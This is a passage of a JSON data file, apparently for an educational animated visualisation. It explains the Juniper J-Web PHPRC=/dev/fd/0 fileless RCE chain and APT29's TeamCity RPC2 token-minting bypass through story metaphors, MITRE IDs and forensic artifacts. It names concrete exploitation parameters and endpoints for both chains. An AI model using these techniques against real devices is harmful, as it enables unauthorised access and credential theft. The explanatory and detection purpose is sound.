          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Line",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "INJECTING AUTO_PREPEND_FILE=\"DATA://...\" IN THE HTTP POST BODY",
          "storyExcerpt": "Inside the very same envelope body, the outsider writes two configuration lines: one allowing live inline notes to run as scripts, and a second instructing the clerk to execute a bundled inline note…",
          "technicalParallel": "Because both the fake php.ini (/dev/fd/0) and the prepended PHP script (data://text/plain;base64...) exist strictly in memory streams, zero files are ever created in /var/tmp/ on the firewall.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. In-memory",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "FILELESS IN-MEMORY PHP EXECUTION & JUNOS CONFIG EXTRACTION",
          "storyExcerpt": "Before even touching the normal login screen, the clerk executes the inline note purely in memory and reads out the locked master configuration binder containing network routes and secret keys.",
          "technicalParallel": "In Junos OS, passwords encrypted with the reversible $9$ format inside juniper.conf can be instantly decrypted offline using known Junos $9$ decoding scripts.",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Router Booth",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Rulebook Rack",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Config Swap",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "juniper-junos-jweb-cve-2023-36845-chain",
      "sectionKey": "step-1",
      "sceneKind": "net-juniper-jweb-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Setting PHPRC=/dev/fd/0 on /webauth_operation.php Without Authentication (CVE-2023-36845)",
      "storyCue": "An outsider mails an unauthenticated form to the booth clerk with an environment override instructing the clerk to read their configuration rules directly from the incoming mail envelope instead of the locked wall cabinet.",
      "technicalCue": "T1190 · INITIAL ACCESS — On Juniper SRX firewalls and EX switches running J-Web, the Appweb HTTP server spawns /usr/local/bin/php-cgi to process PHP pages like /webauth_operation.php (which is reachable without logging…",
      "storyMappings": [
        {
          "storyTerm": "Booth clerk form window",
          "technicalTerm": "Publicly exposed /webauth_operation.php endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Environment override slip",
          "technicalTerm": "Unauthenticated PHPRC environment variable manipulation",
          "tone": "sky"
        },
        {
          "storyTerm": "Incoming mail envelope stream",
          "technicalTerm": "Standard input descriptor /dev/fd/0",
          "tone": "rose"
        },
        {
          "storyTerm": "Booth visitor ledger",
          "technicalTerm": "J-Web /var/log/httpd.log access records",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-juniper-jweb-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Booth clerk form window",
          "subtitle": "Publicly exposed /webauth_operation.php endpoint",
          "tone": "amber"
        },
        {
          "id": "net-juniper-jweb-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Environment override slip",
          "subtitle": "Unauthenticated PHPRC environment variable manipulation",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Form",
          "stageTag": "STEP 01 · SETUP",
          "title": "Booth clerk form window",
          "storyExcerpt": "An outsider mails an unauthenticated form to the booth clerk with an environment override instructing the clerk to read their configuration rules directly from the incoming mail envelope…",
          "technicalParallel": "Compare the two multi-source approaches: watchTowr Labs first demonstrated a 2-step chain (uploading a file via CVE-2023-36846 and pointing PHPRC to that uploaded file), whereas VulnCheck showed that…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Slip",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Environment override slip",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses environment override slip to advance toward incoming mail envelope stream.",
          "technicalParallel": "On Juniper SRX firewalls and EX switches running J-Web, the Appweb HTTP server spawns /usr/local/bin/php-cgi to process PHP pages like /webauth_operation.php (which is reachable without logging in).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Mail",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Booth visitor ledger",
          "storyExcerpt": "Behind the scenes, booth visitor ledger captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by watchTowr, VulnCheck, and Suricata SID 2047892 (network and web log alerts for CVE-2023-36845): HTTP POST requests containing PHPRC= overrides in /var/log/httpd.log (exposing attempts to…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Router Booth",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Rulebook Rack",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Config Swap",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "juniper-junos-jweb-cve-2023-36845-chain",
      "sectionKey": "step-2",
      "sceneKind": "net-juniper-jweb-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Supplying allow_url_include=1 & auto_prepend_file=\"data://...\" in the POST Body",
      "storyCue": "Inside the very same envelope body, the outsider writes two configuration lines: one allowing live inline notes to run as scripts, and a second instructing the clerk to execute a bundled inline note before opening any regular page.",
      "technicalCue": "T1574.007 · DEFENSE EVASION — As php-cgi initializes before executing webauth_operation.php, it opens /dev/fd/0 and parses the attacker’s HTTP POST body as php.ini directives.",
      "storyMappings": [
        {
          "storyTerm": "Inline script permission line",
          "technicalTerm": "PHP allow_url_include=1 configuration directive",
          "tone": "amber"
        },
        {
          "storyTerm": "Mandatory opening note line",
          "technicalTerm": "PHP auto_prepend_file data stream directive",
          "tone": "sky"
        },
        {
          "storyTerm": "Envelope body payload",
          "technicalTerm": "HTTP POST body fed directly via /dev/fd/0",
          "tone": "rose"
        },
        {
          "storyTerm": "Deep parcel inspection",
          "technicalTerm": "Network packet capture inspecting J-Web POST bodies",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-juniper-jweb-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Inline script permission line",
          "subtitle": "PHP allow_url_include=1 configuration directive",
          "tone": "amber"
        },
        {
          "id": "net-juniper-jweb-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Mandatory opening note line",
          "subtitle": "PHP auto_prepend_file data stream directive",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Line",
          "stageTag": "STEP 02 · SETUP",
          "title": "Inline script permission line",
          "storyExcerpt": "Inside the very same envelope body, the outsider writes two configuration lines: one allowing live inline notes to run as scripts, and a second instructing the clerk to execute a bundled inline…",
          "technicalParallel": "Because both the fake php.ini (/dev/fd/0) and the prepended PHP script (data://text/plain;base64...) exist strictly in memory streams, zero files are ever created in /var/tmp/ on the firewall.",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Note Line",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Mandatory opening note line",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses mandatory opening note line to advance toward envelope body payload.",
          "technicalParallel": "As php-cgi initializes before executing webauth_operation.php, it opens /dev/fd/0 and parses the attacker’s HTTP POST body as php.ini directives.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Body",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Deep parcel inspection",
          "storyExcerpt": "Behind the scenes, deep parcel inspection captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by VulnCheck (deep packet inspection indicators for fileless J-Web exploitation): Network inspection showing allow_url_include and auto_prepend_file directives inside HTTP POST bodies sent to…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Router Booth",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Rulebook Rack",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Config Swap",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1574.007"
    },
    "step-3": {
      "scenarioId": "juniper-junos-jweb-cve-2023-36845-chain",
      "sectionKey": "step-3",
      "sceneKind": "net-juniper-jweb-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "Executing In-Memory PHP system() & Exfiltrating /config/juniper.conf.gz",
      "storyCue": "Before even touching the normal login screen, the clerk executes the inline note purely in memory and reads out the locked master configuration binder containing network routes and secret keys.",
      "technicalCue": "T1059.004 · EXECUTION — When php-cgi executes the prepended data:// stream, the attacker’s PHP code invokes system or passthru to run FreeBSD shell commands on the Junos device (such as extracting…",
      "storyMappings": [
        {
          "storyTerm": "Purely in-memory execution",
          "technicalTerm": "Fileless PHP interpreter command execution",
          "tone": "amber"
        },
        {
          "storyTerm": "Router management clerk",
          "technicalTerm": "php-cgi worker spawning /bin/sh or /usr/sbin/cli",
          "tone": "sky"
        },
        {
          "storyTerm": "Master configuration binder",
          "technicalTerm": "Protected /config/juniper.conf configuration file",
          "tone": "rose"
        },
        {
          "storyTerm": "Security patch advisory",
          "technicalTerm": "Juniper JSA72300 remediation and audit guidance",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-juniper-jweb-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Purely in-memory execution",
          "subtitle": "Fileless PHP interpreter command execution",
          "tone": "amber"
        },
        {
          "id": "net-juniper-jweb-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Router management clerk",
          "subtitle": "php-cgi worker spawning /bin/sh or /usr/sbin/cli",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. In-memory",
          "stageTag": "STEP 03 · SETUP",
          "title": "Purely in-memory execution",
          "storyExcerpt": "Before even touching the normal login screen, the clerk executes the inline note purely in memory and reads out the locked master configuration binder containing network routes and secret keys.",
          "technicalParallel": "In Junos OS, passwords encrypted with the reversible $9$ format inside juniper.conf can be instantly decrypted offline using known Junos $9$ decoding scripts.",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Router management clerk",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses router management clerk to advance toward master configuration binder.",
          "technicalParallel": "When php-cgi executes the prepended data:// stream, the attacker’s PHP code invokes system or passthru to run FreeBSD shell commands on the Junos device (such as extracting /config/juniper.conf.gz, which…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Even Note",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Security patch advisory",
          "storyExcerpt": "Behind the scenes, security patch advisory captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Juniper JSA72300 and CISA KEV (post-exploitation process and web log artifacts): /var/log/httpd.log entries targeting /webauth_operation.php paired with php-cgi spawning /bin/sh or…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Router Booth",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Rulebook Rack",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Config Swap",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.004"
    },
    "memory-forensics": {
      "scenarioId": "juniper-junos-jweb-cve-2023-36845-chain",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-juniper-jweb-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "Juniper Junos OS J-Web: PHPRC \"/dev/fd/0\" Fileless Pre-Auth RCE — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of router booth beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: php-cgi (PHPRC=/dev/fd/0) (php-cgi In-Memory INI + data:// Stream [RW-])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of php-cgi (PHPRC=/dev/fd/0)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x0000000801A00000 (RW-, 16 KB) · php-cgi In-Memory INI + data:// Stream",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against php-cgi (PHPRC=/dev/fd/0) (PID 8842)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "php-cgi parsing standard input (/dev/fd/0) as php.ini and prepending a base64 data:// PHP payload before…",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-juniper-jweb-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of php-cgi…",
          "tone": "sky"
        },
        {
          "id": "net-juniper-jweb-memory-xray-right",
          "tag": "LIVE MEMORY · RW-",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x0000000801A00000 (RW-, 16 KB) · php-cgi In-Memory INI +…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline php-cgi (PHPRC=/dev/fd/0) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x0000000801A00000 (RW-, 16 KB) containing php-cgi In-Memory INI + data:// Stream.",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 8842 confirms injected region: php-cgi parsing standard input (/dev/fd/0) as php.ini and prepending a base64 data:// PHP payload before webauth_operation.php.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "mandiant-apt29-teamcity-jetstream": {
    "briefing": {
      "scenarioId": "mandiant-apt29-teamcity-jetstream",
      "sectionKey": "briefing",
      "sceneKind": "net-apt29-teamcity-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "APT29 (Midnight Blizzard): JetBrains TeamCity RCE & GraphicalProton — Story-to-Technical Overview",
      "storyCue": "A factory assembly hub locks its supervisor offices behind a strict badge reader, yet an old side-door bell lets anyone mint a fresh master badge without showing identification. With that freshly minted badge, an intruder unlocks the factory repair console, steals product blueprints, and opens a covert courier drop to an outside locker.",
      "technicalCue": "INITIAL ACCESS: TEAMCITY REST API AUTH BYPASS & TOKEN MINTING (CVE-2023-42793) -> EXECUTION: DEBUG PROCESS RCE & CI/CD SECRET HARVESTING -> LATERAL & C2: GRAPHICALPROTON IMPLANT & ONEDRIVE GRAPH API C2",
      "storyMappings": [
        {
          "storyTerm": "Factory assembly hub",
          "technicalTerm": "JetBrains TeamCity build automation server",
          "tone": "amber"
        },
        {
          "storyTerm": "Old side-door bell",
          "technicalTerm": "Unauthenticated /RPC2 route bypass (CVE-2023-42793)",
          "tone": "sky"
        },
        {
          "storyTerm": "Factory repair console",
          "technicalTerm": "Internal debug process execution API",
          "tone": "rose"
        },
        {
          "storyTerm": "Outside courier locker",
          "technicalTerm": "Cloud-hosted command-and-control channel",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-apt29-teamcity-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Factory assembly hub",
          "subtitle": "JetBrains TeamCity build automation server",
          "tone": "amber"
        },
        {
          "id": "net-apt29-teamcity-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Old side-door bell",
          "subtitle": "Unauthenticated /RPC2 route bypass (CVE-2023-42793)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Bell",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "TEAMCITY REST API AUTH BYPASS & TOKEN MINTING (CVE-2023-42793)",
          "storyExcerpt": "An outsider rings a legacy service bell tagged onto the badge-printer route. Because the guard desk exempts that legacy bell from badge checks, the printer immediately issues a shiny master supervisor…",
          "technicalParallel": "Because TeamCity’s REST API endpoint for creating access tokens follows the URL template /app/rest/users/{userLocator}/tokens/{tokenName}, naming the token \"RPC2\" satisfies both the REST controller…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Old Side-door",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "DEBUG PROCESS RCE & CI/CD SECRET HARVESTING",
          "storyExcerpt": "Holding the newly minted keycard, the intruder flips the maintenance switch that enables direct workshop commands and sends a discovery checklist straight through the factory supervisor terminal.",
          "technicalParallel": "Although deleting the RPC2 token removes it from the current UI token table, the token creation and deletion events remain recorded in logs/teamcity-activities.log and child process creations are…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Impact Beat",
          "stageTag": "STAGE 03 · LATERAL & C2",
          "title": "GRAPHICALPROTON IMPLANT & ONEDRIVE GRAPH API C2",
          "storyExcerpt": "Now roaming the assembly floor, the intruder copies signing seals and vault combinations from the build lockers, registers a backup supervisor account, and drops a quiet messenger beacon synced to a…",
          "technicalParallel": "Compromising a CI/CD server gives the attacker a force-multiplier: they can both steal production cloud credentials stored in build variables and inject malicious code into software packages being built…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Build Deck",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Token Kiosk",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Master Token",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "mandiant-apt29-teamcity-jetstream",
      "sectionKey": "step-1",
      "sceneKind": "net-apt29-teamcity-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Appending \"/RPC2\" to Mint an Admin Bearer Token Without Logging In (CVE-2023-42793)",
      "storyCue": "An outsider rings a legacy service bell tagged onto the badge-printer route. Because the guard desk exempts that legacy bell from badge checks, the printer immediately issues a shiny master supervisor keycard.",
      "technicalCue": "T1190 · INITIAL ACCESS — As detailed by SonarSource and Rapid7, in vulnerable TeamCity versions the RequestInterceptors authentication filter excluded any URL matching //RPC2 from login checks (intended only to exempt…",
      "storyMappings": [
        {
          "storyTerm": "Legacy service bell",
          "technicalTerm": "Appended /RPC2 URL suffix bypassing auth filter",
          "tone": "amber"
        },
        {
          "storyTerm": "Badge-printer route",
          "technicalTerm": "REST endpoint /app/rest/users/id:1/tokens/",
          "tone": "sky"
        },
        {
          "storyTerm": "Master supervisor keycard",
          "technicalTerm": "Minted administrator Bearer authentication token",
          "tone": "rose"
        },
        {
          "storyTerm": "Guard desk exemption",
          "technicalTerm": "Path-matching authentication flaw (CVE-2023-42793)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-apt29-teamcity-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Legacy service bell",
          "subtitle": "Appended /RPC2 URL suffix bypassing auth filter",
          "tone": "amber"
        },
        {
          "id": "net-apt29-teamcity-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Badge-printer route",
          "subtitle": "REST endpoint /app/rest/users/id:1/tokens/",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Bell",
          "stageTag": "STEP 01 · SETUP",
          "title": "Legacy service bell",
          "storyExcerpt": "An outsider rings a legacy service bell tagged onto the badge-printer route.",
          "technicalParallel": "Because TeamCity’s REST API endpoint for creating access tokens follows the URL template /app/rest/users/{userLocator}/tokens/{tokenName}, naming the token \"RPC2\" satisfies both the REST controller…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Desk Bell",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Badge-printer route",
          "storyExcerpt": "Because the guard desk exempts that legacy bell from badge checks, the printer immediately issues a shiny master supervisor keycard.",
          "technicalParallel": "As detailed by SonarSource and Rapid7, in vulnerable TeamCity versions the RequestInterceptors authentication filter excluded any URL matching //RPC2 from login checks (intended only to exempt the legacy…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Desk",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Guard desk exemption",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across guard desk exemption while locking down master supervisor keycard.",
          "technicalParallel": "Documented in TeamCity teamcity-javaLogging and access logs (web server audit records of token minting): POST /app/rest/users/id:1/tokens/RPC2 returning HTTP 200 followed by DELETE…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Build Deck",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Token Kiosk",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Master Token",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "mandiant-apt29-teamcity-jetstream",
      "sectionKey": "step-2",
      "sceneKind": "net-apt29-teamcity-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "Using the Admin Token to Unlock the Internal Debug Process Executor (/app/rest/debug/processes)",
      "storyCue": "Holding the newly minted keycard, the intruder flips the maintenance switch that enables direct workshop commands and sends a discovery checklist straight through the factory supervisor terminal.",
      "technicalCue": "T1059.003 · EXECUTION — Authenticating with Authorization: Bearer <token>, the attacker first sets the internal server property rest.debug.processes.enable=true (unlocking a hidden administrative diagnostic feature…",
      "storyMappings": [
        {
          "storyTerm": "Maintenance switch",
          "technicalTerm": "Internal debug property enabling process execution",
          "tone": "amber"
        },
        {
          "storyTerm": "Factory supervisor terminal",
          "technicalTerm": "POST /app/rest/debug/processes endpoint",
          "tone": "sky"
        },
        {
          "storyTerm": "Discovery checklist",
          "technicalTerm": "Executed reconnaissance commands (whoami, nltest, curl)",
          "tone": "rose"
        },
        {
          "storyTerm": "Assembly controller process",
          "technicalTerm": "Server java.exe runtime spawning child utilities",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-apt29-teamcity-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Maintenance switch",
          "subtitle": "Internal debug property enabling process execution",
          "tone": "amber"
        },
        {
          "id": "net-apt29-teamcity-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Factory supervisor terminal",
          "subtitle": "POST /app/rest/debug/processes endpoint",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STEP 02 · SETUP",
          "title": "Maintenance switch",
          "storyExcerpt": "Holding the newly minted keycard, the intruder flips the maintenance switch that enables direct workshop commands and sends a discovery checklist straight through the factory supervisor terminal.",
          "technicalParallel": "Although deleting the RPC2 token removes it from the current UI token table, the token creation and deletion events remain recorded in logs/teamcity-activities.log and child process creations are…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Factory supervisor terminal",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses factory supervisor terminal to advance toward discovery checklist.",
          "technicalParallel": "Authenticating with Authorization: Bearer <token>, the attacker first sets the internal server property rest.debug.processes.enable=true (unlocking a hidden administrative diagnostic feature that is…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Impact Beat",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Assembly controller process",
          "storyExcerpt": "Behind the scenes, assembly controller process captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Mandiant (post-exploitation telemetry from build server compromises): POST /app/rest/debug/processes in teamcity-server.log and java.exe spawning whoami / nltest / curl (confirming remote…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Build Deck",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Token Kiosk",
          "position": [
            5.6,
            4.2,
            8.4
          ],
